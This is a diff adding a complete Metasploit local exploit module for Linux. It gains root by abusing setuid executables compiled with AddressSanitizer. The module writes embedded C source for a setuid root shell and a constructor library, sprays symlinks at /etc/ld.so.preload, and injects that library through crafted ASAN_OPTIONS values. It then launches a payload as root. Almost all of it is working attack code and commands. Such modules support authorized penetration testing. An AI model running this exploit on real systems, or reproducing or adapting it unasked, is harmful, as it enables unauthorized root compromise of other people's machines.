@@ -1,0 +1,292 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AddressSanitizer (ASan) SUID Executable Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Linux systems using
+        setuid executables compiled with AddressSanitizer (ASan).
+
+        ASan configuration related environment variables are permitted when
+        executing setuid executables built with libasan. The `log_path` option
+        can be set using the `ASAN_OPTIONS` environment variable, allowing
+        clobbering of arbitrary files, with the privileges of the setuid user.
+
+        This module uploads a shared object and sprays symlinks to overwrite
+        `/etc/ld.so.preload` in order to create a setuid root shell.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Szabolcs Nagy', # Discovery and PoC
+          'infodox',       # unsanitary.sh Exploit
+          'bcoles'         # Metasploit
+        ],
+      'DisclosureDate' => '2016-02-17',
+      'Platform'       => 'linux',
+      'Arch'           =>
+        [
+          ARCH_X86,
+          ARCH_X64,
+          ARCH_ARMLE,
+          ARCH_AARCH64,
+          ARCH_PPC,
+          ARCH_MIPSLE,
+          ARCH_MIPSBE
+        ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [['Auto', {}]],
+      'DefaultOptions' =>
+        {
+          'AppendExit'       => true,
+          'PrependSetresuid' => true,
+          'PrependSetresgid' => true,
+          'PrependFork'      => true
+        },
+      'References'     =>
+        [
+          ['URL', 'https://seclists.org/oss-sec/2016/q1/363'],
+          ['URL', 'https://seclists.org/oss-sec/2016/q1/379'],
+          ['URL', 'https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e'],
+          ['URL', 'https://github.com/bcoles/local-exploits/tree/master/asan-suid-root']
+        ],
+      'Notes' =>
+        {
+          'AKA' => ['unsanitary.sh']
+        },
+      'DefaultTarget'  => 0))
+    register_options [
+      OptString.new('SUID_EXECUTABLE', [true, 'Path to a SUID executable compiled with ASan', '']),
+      OptInt.new('SPRAY_SIZE', [true, 'Number of PID symlinks to create', 50])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def suid_exe_path
+    datastore['SUID_EXECUTABLE']
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def upload_and_chmodx(path, data)
+    upload path, data
+    chmod path
+  end
+
+  def upload_and_compile(path, data, gcc_args='')
+    upload "#{path}.c", data
+
+    gcc_cmd = "gcc -o #{path} #{path}.c"
+    if session.type.eql? 'shell'
+      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
+    end
+
+    unless gcc_args.to_s.blank?
+      gcc_cmd << " #{gcc_args}"
+    end
+
+    output = cmd_exec gcc_cmd
+
+    unless output.blank?
+      print_error 'Compiling failed:'
+      print_line output
+    end
+
+    register_file_for_cleanup path
+    chmod path
+  end
+
+  def check
+    unless setuid? suid_exe_path
+      vprint_error "#{suid_exe_path} is not setuid"
+      return CheckCode::Safe
+    end
+    vprint_good "#{suid_exe_path} is setuid"
+
+    # Check if the executable was compiled with ASan
+    #
+    # If the setuid executable is readable, and `ldd` is installed and in $PATH,
+    # we can detect ASan via linked libraries. (`objdump` could also be used).
+    #
+    # Otherwise, we can try to detect ASan via the help output with the `help=1` option.
+    # This approach works regardless of whether the setuid executable is readable,
+    # with the obvious disadvantage that it requires invoking the executable.
+    if cmd_exec("test -r #{suid_exe_path} && echo true").to_s.include?('true') && command_exists?('ldd')
+      unless cmd_exec("ldd #{suid_exe_path}").to_s.include? 'libasan.so'
+        vprint_error "#{suid_exe_path} was not compiled with ASan"
+        return CheckCode::Safe
+      end
+    else
+      unless cmd_exec("ASAN_OPTIONS=help=1 #{suid_exe_path}").include? 'AddressSanitizer'
+        vprint_error "#{suid_exe_path} was not compiled with ASan"
+        return CheckCode::Safe
+      end
+    end
+    vprint_good "#{suid_exe_path} was compiled with ASan"
+
+    unless has_gcc?
+      print_error 'gcc is not installed. Compiling will fail.'
+      return CheckCode::Safe
+    end
+    vprint_good 'gcc is installed'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    unless writable? pwd.to_s.strip
+      fail_with Failure::BadConfig, "#{pwd.to_s.strip} working directory is not writable"
+    end
+
+    if nosuid? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is mounted nosuid"
+    end
+
+    @log_prefix = ".#{rand_text_alphanumeric 5..10}"
+
+    payload_name = ".#{rand_text_alphanumeric 5..10}"
+    payload_path = "#{base_dir}/#{payload_name}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    rootshell_name = ".#{rand_text_alphanumeric 5..10}"
+    @rootshell_path = "#{base_dir}/#{rootshell_name}"
+    rootshell = <<-EOF
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+int main(void)
+{
+  setuid(0);
+  setgid(0);
+  execl("/bin/bash", "bash", NULL);
+}
+    EOF
+    upload_and_compile @rootshell_path, rootshell, '-Wall'
+
+    lib_name = ".#{rand_text_alphanumeric 5..10}"
+    lib_path = "#{base_dir}/#{lib_name}.so"
+    lib = <<-EOF
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+void init(void) __attribute__((constructor));
+void __attribute__((constructor)) init() {
+  if (setuid(0) || setgid(0))
+    _exit(1);
+  unlink("/etc/ld.so.preload");
+  chown("#{@rootshell_path}", 0, 0);
+  chmod("#{@rootshell_path}", 04755);
+  _exit(0);
+}
+    EOF
+    upload_and_compile lib_path, lib, '-fPIC -shared -ldl -Wall'
+
+    spray_name = ".#{rand_text_alphanumeric 5..10}"
+    spray_path = "#{base_dir}/#{spray_name}"
+    spray = <<-EOF
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+int main(void)
+{
+  pid_t pid = getpid();
+  char buf[64];
+  for (int i=0; i<=#{datastore['SPRAY_SIZE']}; i++) {
+    snprintf(buf, sizeof(buf), "#{@log_prefix}.%ld", (long)pid+i);
+    symlink("/etc/ld.so.preload", buf);
+  }
+}
+    EOF
+    upload_and_compile spray_path, spray, '-Wall'
+
+    exp_name = ".#{rand_text_alphanumeric 5..10}"
+    exp_path = "#{base_dir}/#{exp_name}"
+    exp = <<-EOF
+#!/bin/sh
+#{spray_path}
+ASAN_OPTIONS="disable_coredump=1 suppressions='/#{@log_prefix}
+#{lib_path}
+' log_path=./#{@log_prefix} verbosity=0" "#{suid_exe_path}" >/dev/null 2>&1
+ASAN_OPTIONS='disable_coredump=1 abort_on_error=1 verbosity=0' "#{suid_exe_path}" >/dev/null 2>&1
+    EOF
+    upload_and_chmodx exp_path, exp
+
+    print_status 'Launching exploit...'
+    output = cmd_exec exp_path
+    output.each_line { |line| vprint_status line.chomp }
+
+    unless setuid? @rootshell_path
+      fail_with Failure::Unknown, "Failed to set-uid root #{@rootshell_path}"
+    end
+    print_good "Success! #{@rootshell_path} is set-uid root!"
+    vprint_line cmd_exec "ls -la #{@rootshell_path}"
+
+    print_status 'Executing payload...'
+    cmd_exec "echo #{payload_path} | #{@rootshell_path} & echo "
+  end
+
+  def cleanup
+    # Safety check to ensure we don't delete everything in the working directory
+    if @log_prefix.to_s.strip.eql? ''
+      vprint_warning "#{datastore['SPRAY_SIZE']} symlinks may require manual cleanup in: #{pwd}"
+    else
+      cmd_exec "rm #{pwd}/#{@log_prefix}*"
+    end
+  ensure
+    super
+  end
+
+  def on_new_session(session)
+    # Remove rootshell executable
+    if session.type.eql? 'meterpreter'
+      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
+      session.fs.file.rm @rootshell_path
+    else
+      session.shell_command_token "rm -f '#{@rootshell_path}'"
+    end
+  ensure
+    super
+  end
+end
